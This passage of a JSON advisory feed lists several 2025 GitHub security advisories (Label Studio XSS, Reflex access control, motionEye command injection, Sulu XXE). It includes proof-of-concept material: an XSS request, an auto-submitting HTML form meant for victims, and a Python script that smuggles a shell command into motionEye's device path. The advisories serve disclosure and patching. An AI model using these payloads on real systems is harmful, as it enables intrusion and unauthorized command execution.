+    "description": "### Summary\nThe vulnerability allows an attacker to inject a malicious script into the context of a web page, which can lead to data theft, unauthorized actions on behalf of the user, and other attacks.\n\n### Details\nThe vulnerability is reproducible when sending a properly formatted request to the `POST /projects/upload-example/` endpoint. In the source code, the vulnerability is located at `label_studio/projects/views.py`.\n```python\n39: @require_http_methods(['POST'])\n40: def upload_example_using_config(request):\n41:     \"\"\"Generate upload data example by config only\"\"\"\n42:     config = request.POST.get('label_config', '')\n43: \n44:     org_pk = get_organization_from_request(request)\n45:     secure_mode = False\n46:     if org_pk is not None:\n47:         org = generics.get_object_or_404(Organization, pk=org_pk)\n48:         secure_mode = org.secure_mode\n49: \n50:     try:\n51:         Project.validate_label_config(config)\n52:         task_data, _, _ = get_sample_task(config, secure_mode)\n53:         task_data = playground_replacements(request, task_data)\n54:     except (ValueError, ValidationError, lxml.etree.Error):\n55:         response = HttpResponse('error while example generating', status=status.HTTP_400_BAD_REQUEST)\n56:     else:\n57:         response = HttpResponse(json.dumps(task_data))\n58:     return response\n```\nThe vulnerability is specifically located in line 57, where HttpResponse is used.\n```python\n57:         response = HttpResponse(json.dumps(task_data))\n```\n### PoC\nSend the following request after changing the `{host}` to your own.\n```css\nPOST /projects/upload-example/ HTTP/1.1\nHost: {host}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 67\n\nlabel_config=%3cView%3e%3cText%20name%3d%22text%22%20value%3d%22$textjmwwi%26lt%3bscript%26gt%3balert(1)%26lt%3b%2fscript%26gt%3bs8m37%22%2f%3e%3c%2fView%3e\n```\nOr you can create a vulnerable HTML page by changing `{domain}` beforehand, which can later be sent to the victim.\n```html\n<html>\n  <body>\n    <form action=\"http://{domain}/projects/upload-example/\" method=\"POST\">\n      <input type=\"hidden\" name=\"label&#95;config\" value=\"&lt;View&gt;&lt;Text&#32;name&#61;&quot;text&quot;&#32;value&#61;&quot;&#36;textjmwwi&amp;lt&#59;script&amp;gt&#59;alert&#40;1&#41;&amp;lt&#59;&#47;script&amp;gt&#59;s8m37&quot;&#47;&gt;&lt;&#47;View&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n### Impact\n- Malicious code execution: The user may be forced to perform unwanted actions within their Label Studio account. This includes accessing `document.cookie`, but note that Label Studio session cookies are marked http-only, mitigating any possibility of session theft.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/HumanSignal/label-studio/security-advisories/GHSA-8jhr-wpcm-hh4h",
+    "source_code_location": "https://github.com/HumanSignal/label-studio",
+    "identifiers": [
+      {
+        "value": "GHSA-8jhr-wpcm-hh4h",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47783",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/HumanSignal/label-studio/security/advisories/GHSA-8jhr-wpcm-hh4h",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47783",
+      "https://github.com/HumanSignal/label-studio/commit/97db9e7b16783e1f6052eb432a6f014f80ef268d",
+      "https://github.com/advisories/GHSA-8jhr-wpcm-hh4h"
+    ],
+    "published_at": "2025-05-15T16:21:16Z",
+    "updated_at": "2025-05-15T16:21:17Z",
+    "github_reviewed_at": "2025-05-15T16:21:16Z",
+    "nvd_published_at": "2025-05-14T23:15:48Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "label-studio"
+        },
+        "vulnerable_version_range": "< 1.18.0",
+        "first_patched_version": "1.18.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N",
+        "score": 7.6
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Medok228",
+          "id": 101337215,
+          "node_id": "U_kgDOBgpIfw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/101337215?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Medok228",
+          "html_url": "https://github.com/Medok228",
+          "followers_url": "https://api.github.com/users/Medok228/followers",
+          "following_url": "https://api.github.com/users/Medok228/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Medok228/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Medok228/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Medok228/subscriptions",
+          "organizations_url": "https://api.github.com/users/Medok228/orgs",
+          "repos_url": "https://api.github.com/users/Medok228/repos",
+          "events_url": "https://api.github.com/users/Medok228/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Medok228/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00047,
+      "percentile": 0.14369
+    }
+  },
+  {
+    "ghsa_id": "GHSA-rf8x-9mhr-49wg",
+    "cve_id": "CVE-2025-47425",
+    "url": "https://api.github.com/advisories/GHSA-rf8x-9mhr-49wg",
+    "html_url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
+    "summary": "Reflex vulnerable to private state fields modification",
+    "description": "### Summary\n\nA user on the website can modify any private field on their own state.\n\n### Details\n\nAn event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.\n\n### Impact\n\nIf one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/reflex-dev/reflex/security-advisories/GHSA-rf8x-9mhr-49wg",
+    "source_code_location": "https://github.com/reflex-dev/reflex",
+    "identifiers": [
+      {
+        "value": "GHSA-rf8x-9mhr-49wg",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47425",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg",
+      "https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36",
+      "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
+    ],
+    "published_at": "2025-05-15T16:15:19Z",
+    "updated_at": "2025-05-15T16:15:20Z",
+    "github_reviewed_at": "2025-05-15T16:15:19Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": ">= 0.2.7, < 0.4.9.post1",
+        "first_patched_version": "0.4.9.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.4.9.post1, < 0.5.10.post1",
+        "first_patched_version": "0.5.10.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.5.10.post1, < 0.6.8.post1",
+        "first_patched_version": "0.6.8.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.6.8.post1, < 0.7.1.post1",
+        "first_patched_version": "0.7.1.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.1.post1, < 0.7.2.post1",
+        "first_patched_version": "0.7.2.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.2.post1, < 0.7.3.post1",
+        "first_patched_version": "0.7.3.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.3.post1, < 0.7.4.post1",
+        "first_patched_version": "0.7.4.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.4.post1, < 0.7.5.post1",
+        "first_patched_version": "0.7.5.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.5.post1, < 0.7.6.post1",
+        "first_patched_version": "0.7.6.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.6.post1, < 0.7.7.post1",
+        "first_patched_version": "0.7.7.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.7.post1, < 0.7.8.post1",
+        "first_patched_version": "0.7.8.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.8.post1, < 0.7.9.post1",
+        "first_patched_version": "0.7.9.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.9.post1, < 0.7.10.post1",
+        "first_patched_version": "0.7.10.post1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "reflex"
+        },
+        "vulnerable_version_range": "> 0.7.10.post1, < 0.7.11",
+        "first_patched_version": "0.7.11",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+        "score": 8.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-284",
+        "name": "Improper Access Control"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "adhami3310",
+          "id": 27952765,
+          "node_id": "MDQ6VXNlcjI3OTUyNzY1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/27952765?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/adhami3310",
+          "html_url": "https://github.com/adhami3310",
+          "followers_url": "https://api.github.com/users/adhami3310/followers",
+          "following_url": "https://api.github.com/users/adhami3310/following{/other_user}",
+          "gists_url": "https://api.github.com/users/adhami3310/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/adhami3310/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/adhami3310/subscriptions",
+          "organizations_url": "https://api.github.com/users/adhami3310/orgs",
+          "repos_url": "https://api.github.com/users/adhami3310/repos",
+          "events_url": "https://api.github.com/users/adhami3310/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/adhami3310/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "coordinator"
+      },
+      {
+        "user": {
+          "login": "masenf",
+          "id": 1524005,
+          "node_id": "MDQ6VXNlcjE1MjQwMDU=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1524005?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/masenf",
+          "html_url": "https://github.com/masenf",
+          "followers_url": "https://api.github.com/users/masenf/followers",
+          "following_url": "https://api.github.com/users/masenf/following{/other_user}",
+          "gists_url": "https://api.github.com/users/masenf/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/masenf/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/masenf/subscriptions",
+          "organizations_url": "https://api.github.com/users/masenf/orgs",
+          "repos_url": "https://api.github.com/users/masenf/repos",
+          "events_url": "https://api.github.com/users/masenf/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/masenf/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "Kastier1",
+          "id": 40179067,
+          "node_id": "MDQ6VXNlcjQwMTc5MDY3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/40179067?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Kastier1",
+          "html_url": "https://github.com/Kastier1",
+          "followers_url": "https://api.github.com/users/Kastier1/followers",
+          "following_url": "https://api.github.com/users/Kastier1/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Kastier1/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Kastier1/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Kastier1/subscriptions",
+          "organizations_url": "https://api.github.com/users/Kastier1/orgs",
+          "repos_url": "https://api.github.com/users/Kastier1/repos",
+          "events_url": "https://api.github.com/users/Kastier1/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Kastier1/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "coordinator"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+      "score": 8.1
+    }
+  },
+  {
+    "ghsa_id": "GHSA-g5mq-prx7-c588",
+    "cve_id": "CVE-2025-47782",
+    "url": "https://api.github.com/advisories/GHSA-g5mq-prx7-c588",
+    "html_url": "https://github.com/advisories/GHSA-g5mq-prx7-c588",
+    "summary": "motionEye vulnerable to RCE in add_camera Function Due to unsafe command execution",
+    "description": "### Summary\nUsing a constructed (camera) device path with the `config/add`/`add_camera` motionEye web API allows an attacker with motionEye admin user credentials to execute any UNIX shell code within a non-interactive shell as executing user of the motionEye instance, `motion` by default.\n\n#### function call stack\n1. `post`\n2. `add_camera`\n3. `config.add_camera`\n4. `v4l2ctl.list_resolutions`\n5. `utils.call_subprocess`\n6. `subprocess.run`\n\n### PoC\n#### build\n```sh\nRUN_USER=\"user\"\nRUN_UID=$(id -u ${RUN_USER})\nRUN_GID=$(id -g ${RUN_USER})\nTIMESTAMP=\"$(date '+%Y%m%d-%H%M')\"\n\ndocker build \\\n  --network host \\\n  --build-arg=\"RUN_UID=${RUN_UID?}\" \\\n  --build-arg=\"RUN_GID=${RUN_GID?}\" \\\n  -t \"${USER?}/motioneye:${TIMESTAMP}\" \\\n  --no-cache \\\n  -f docker/Dockerfile .\n```\n\n#### reproduce\nRun:\n```sh\ndocker run --rm  -d   -p 8765:8765   --hostname=\"motioneye\"   -v /etc/localtime:/etc/localtime:ro   -v /tmp/motioneyeconfig:/etc/motioneye   -v /tmp/motioneyeconfig:/var/lib/motioneye\n```\n```console\nbash-4.2$ docker logs ceb435eacf55 -f\nconfigure_logging cmd motioneye: False\nconfigure logging to file: None\n    INFO: hello! this is motionEye server 0.43.1b3\n   DEBUG: found motion executable \"/usr/bin/motion\" version \"4.7.0\"\n   DEBUG: found ffmpeg executable \"/usr/bin/ffmpeg\" version \"7.1.1-1+b1\"\n   DEBUG: listing config dir /etc/motioneye...\n   DEBUG: found camera with id 1\n   DEBUG: reading camera config from /etc/motioneye/camera-1.conf...\n   DEBUG: loading additional config structure for camera, without separators\n   DEBUG: Using selector: EpollSelector\n   DEBUG: searching motion executable\n   DEBUG: starting motion executable \"/usr/bin/motion\" version \"4.7.0\"\n    INFO: cleanup started\n    INFO: wsswitch started\n    INFO: tasks started\n    INFO: mjpg customer garbage collector has started\n    INFO: server started\n```\nNow, run the following script to attack motionEye:\n```python\nimport requests\nimport json\n\nurl = \"http://your_ip:8765/config/add?_username=admin&_signature=c22baef3399cb7328e22ded1ca68395b4daecd18\"\n\npayload = json.dumps({\n  \"proto\": \"v4l2\",\n  \"path\": \"' `touch /tmp/bbbb` '\"\n})\nheaders = {\n  'Content-Type': 'application/json'\n}\n\nresponse = requests.request(\"POST\", url, headers=headers, data=payload)\n\nprint(response.text)\n```\n\n<img width=\"1187\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/8e0a9bfe-8de3-4023-96d6-0e888bfe3c62\" />\n\n<img width=\"324\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/04c73349-694a-4531-993e-eea765b87d0e\" />\n\n#### Discussion\nIt is obvious that call_subprocess was used to execute the incoming data, resulting in a vulnerability\n```python\ndef list_resolutions(device):\n    from motioneye import motionctl\n\n    device = utils.make_str(device)\n\n    if device in _resolutions_cache:\n        return _resolutions_cache[device]\n\n    logging.debug(f'listing resolutions of device {device}...')\n\n    resolutions = set()\n    output = b''\n    started = time.time()\n    cmd = f\"v4l2-ctl -d '{device}' --list-formats-ext | grep -vi stepwise | grep -oE '[0-9]+x[0-9]+' || true\"\n    logging.debug(f'running command \"{cmd}\"')\n\n    try:\n        output = utils.call_subprocess(cmd, shell=True, stderr=utils.DEV_NULL)\n    except:\n        logging.error(f'failed to list resolutions of device \"{device}\"')\n\n    output = utils.make_str(output)\n\ndef call_subprocess(\n    args,\n    stdin=None,\n    input=None,\n    stdout=subprocess.PIPE,\n    stderr=DEV_NULL,\n    capture_output=False,\n    shell=False,\n    cwd=None,\n    timeout=None,\n    check=True,\n    encoding='utf-8',\n    errors=None,\n    text=None,\n    env=None,\n) -> str:\n    \"\"\"subprocess.run wrapper to return output as a decoded string\"\"\"\n    return subprocess.run(\n        args,\n        stdin=stdin,\n        input=input,\n        stdout=stdout,\n        stderr=stderr,\n        capture_output=capture_output,\n        shell=shell,\n        cwd=cwd,\n        timeout=timeout,\n        check=check,\n        encoding=encoding,\n        errors=errors,\n        text=text,\n        env=env,\n    ).stdout.strip()\n```\n\n### Impact\nRCE\n\n### Patches\nThe vulnerability has been patch with motionEye v0.43.1b4: https://github.com/motioneye-project/motioneye/pull/3143\n\n### Workarounds\nApplying the following patch, replacing the literal single quotes in the created `cmd` string with a `shlex.quote`d input device: https://patch-diff.githubusercontent.com/raw/motioneye-project/motioneye/pull/3143.patch\n\n### References\nhttps://github.com/motioneye-project/motioneye/issues/3142\n\n### Credit\nThe vulnerability was discovered by Tencent YunDing Security Lab.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/motioneye-project/motioneye/security-advisories/GHSA-g5mq-prx7-c588",
+    "source_code_location": "https://github.com/motioneye-project/motioneye",
+    "identifiers": [
+      {
+        "value": "GHSA-g5mq-prx7-c588",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47782",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/motioneye-project/motioneye/security/advisories/GHSA-g5mq-prx7-c588",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47782",
+      "https://github.com/motioneye-project/motioneye/issues/3142",
+      "https://github.com/motioneye-project/motioneye/pull/3143",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/motioneye/PYSEC-2025-39.yaml",
+      "https://github.com/advisories/GHSA-g5mq-prx7-c588"
+    ],
+    "published_at": "2025-05-15T16:10:48Z",
+    "updated_at": "2025-05-15T16:10:51Z",
+    "github_reviewed_at": "2025-05-15T16:10:48Z",
+    "nvd_published_at": "2025-05-14T16:15:29Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "motioneye"
+        },
+        "vulnerable_version_range": ">= 0.43.1b1, < 0.43.1b4",
+        "first_patched_version": "0.43.1b4",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+        "score": 8.9
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-78",
+        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "hyperlyz",
+          "id": 20871123,
+          "node_id": "MDQ6VXNlcjIwODcxMTIz",
+          "avatar_url": "https://avatars.githubusercontent.com/u/20871123?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/hyperlyz",
+          "html_url": "https://github.com/hyperlyz",
+          "followers_url": "https://api.github.com/users/hyperlyz/followers",
+          "following_url": "https://api.github.com/users/hyperlyz/following{/other_user}",
+          "gists_url": "https://api.github.com/users/hyperlyz/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/hyperlyz/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/hyperlyz/subscriptions",
+          "organizations_url": "https://api.github.com/users/hyperlyz/orgs",
+          "repos_url": "https://api.github.com/users/hyperlyz/repos",
+          "events_url": "https://api.github.com/users/hyperlyz/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/hyperlyz/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "MichaIng",
+          "id": 28480705,
+          "node_id": "MDQ6VXNlcjI4NDgwNzA1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/28480705?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/MichaIng",
+          "html_url": "https://github.com/MichaIng",
+          "followers_url": "https://api.github.com/users/MichaIng/followers",
+          "following_url": "https://api.github.com/users/MichaIng/following{/other_user}",
+          "gists_url": "https://api.github.com/users/MichaIng/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/MichaIng/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/MichaIng/subscriptions",
+          "organizations_url": "https://api.github.com/users/MichaIng/orgs",
+          "repos_url": "https://api.github.com/users/MichaIng/repos",
+          "events_url": "https://api.github.com/users/MichaIng/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/MichaIng/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00045,
+      "percentile": 0.13321
+    }
+  },
+  {
+    "ghsa_id": "GHSA-f6rx-hf55-4255",
+    "cve_id": "CVE-2025-47778",
+    "url": "https://api.github.com/advisories/GHSA-f6rx-hf55-4255",
+    "html_url": "https://github.com/advisories/GHSA-f6rx-hf55-4255",
+    "summary": "Sulu vulnerable to XXE in SVG File upload Inspector",
+    "description": "### Impact\n\nA admin user can upload SVG which may load external data via XML DOM library, specially this can be used for eventually reference none secure XML External Entity References.\n\n### Patches\n\nThe problem has not been patched yet. Users should upgrade to patched versions once they become available. Currently affected versions are:\n\n - 2.6.9\n - 2.5.25\n - 3.0.0-alpha3\n\n### Workarounds\n\nPatch the effect file `src/Sulu/Bundle/MediaBundle/FileInspector/SvgFileInspector.php` in sulu with:\n\n```diff\n-$dom->loadXML($svg, \\LIBXML_NOENT | \\LIBXML_DTDLOAD);\n+$dom->loadXML($data, LIBXML_NONET);\n```\n\n### References\n\n - GitHub repository: https://github.com/sulu/sulu\n - Vulnerable code: https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/FileInspector/SvgFileInspector.php",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/sulu/sulu/security-advisories/GHSA-f6rx-hf55-4255",
+    "source_code_location": "https://github.com/sulu/sulu",
+    "identifiers": [
+      {
+        "value": "GHSA-f6rx-hf55-4255",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47778",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/sulu/sulu/security/advisories/GHSA-f6rx-hf55-4255",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47778",
+      "https://github.com/sulu/sulu/commit/02f52fca04eb9495b9b4a0c5cc64cf23bc27f544",
+      "https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/FileInspector/SvgFileInspector.php",
+      "https://github.com/advisories/GHSA-f6rx-hf55-4255"
+    ],
+    "published_at": "2025-05-15T16:08:02Z",
+    "updated_at": "2025-05-15T16:08:06Z",
+    "github_reviewed_at": "2025-05-15T16:08:02Z",
+    "nvd_published_at": "2025-05-14T16:15:29Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "sulu/sulu"
+        },
+        "vulnerable_version_range": ">= 2.5.21, < 2.5.25",
+        "first_patched_version": "2.5.25",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "sulu/sulu"
+        },
+        "vulnerable_version_range": ">= 2.6.5, < 2.6.9",
+        "first_patched_version": "2.6.9",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "sulu/sulu"
+        },
+        "vulnerable_version_range": ">= 3.0.0-alpha1, < 3.0.0-alpha3",
+        "first_patched_version": "3.0.0-alpha3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:U",
+        "score": 6.1
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-611",
+        "name": "Improper Restriction of XML External Entity Reference"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "mcdruid",
+          "id": 634209,
+          "node_id": "MDQ6VXNlcjYzNDIwOQ==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/634209?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/mcdruid",
+          "html_url": "https://github.com/mcdruid",
+          "followers_url": "https://api.github.com/users/mcdruid/followers",
+          "following_url": "https://api.github.com/users/mcdruid/following{/other_user}",
+          "gists_url": "https://api.github.com/users/mcdruid/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/mcdruid/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/mcdruid/subscriptions",
+          "organizations_url": "https://api.github.com/users/mcdruid/orgs",
+          "repos_url": "https://api.github.com/users/mcdruid/repos",
+          "events_url": "https://api.github.com/users/mcdruid/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/mcdruid/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "alexander-schranz",
+          "id": 1698337,
+          "node_id": "MDQ6VXNlcjE2OTgzMzc=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1698337?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/alexander-schranz",
+          "html_url": "https://github.com/alexander-schranz",
+          "followers_url": "https://api.github.com/users/alexander-schranz/followers",
+          "following_url": "https://api.github.com/users/alexander-schranz/following{/other_user}",
+          "gists_url": "https://api.github.com/users/alexander-schranz/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/alexander-schranz/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/alexander-schranz/subscriptions",
+          "organizations_url": "https://api.github.com/users/alexander-schranz/orgs",
+          "repos_url": "https://api.github.com/users/alexander-schranz/repos",
+          "events_url": "https://api.github.com/users/alexander-schranz/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/alexander-schranz/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      },
+      {
+        "user": {
+          "login": "ausi",
+          "id": 367169,
+          "node_id": "MDQ6VXNlcjM2NzE2OQ==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/367169?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/ausi",
+          "html_url": "https://github.com/ausi",
+          "followers_url": "https://api.github.com/users/ausi/followers",
+          "following_url": "https://api.github.com/users/ausi/following{/other_user}",
+          "gists_url": "https://api.github.com/users/ausi/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/ausi/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/ausi/subscriptions",
+          "organizations_url": "https://api.github.com/users/ausi/orgs",
+          "repos_url": "https://api.github.com/users/ausi/repos",
+          "events_url": "https://api.github.com/users/ausi/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/ausi/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_reviewer"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00049,
+      "percentile": 0.15378
+    }
+  },
+  {
+    "ghsa_id": "GHSA-cxrh-j4jr-qwg3",
+    "cve_id": "CVE-2025-47279",
+    "url": "https://api.github.com/advisories/GHSA-cxrh-j4jr-qwg3",
+    "html_url": "https://github.com/advisories/GHSA-cxrh-j4jr-qwg3",
+    "summary": "undici Denial of Service attack via bad certificate data",
